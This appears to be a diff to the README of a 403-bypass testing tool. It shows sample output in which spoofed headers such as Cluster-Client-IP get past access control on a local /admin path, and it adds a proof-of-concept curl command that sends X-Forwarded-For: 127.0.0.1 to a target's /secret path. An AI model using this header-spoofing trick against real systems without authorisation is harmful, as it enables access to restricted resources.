@@ -49,3 +49,11 @@ GET <http://localhost:8080/admin> 200 OK. Length: 44. Cluster-Client-IP: localho
 GET <http://localhost:8080/admin> 200 OK. Length: 44. X-Forwarded-Port: 8080
 2024/03/15 16:03:41.889985 Finished bypass-403-go
 ```
+
+### Create POC curl
+
+```sh
+curl -X GET \
+  -H "X-Forwarded-For: 127.0.0.1:80" \
+  -i https://target.com/secret
+```
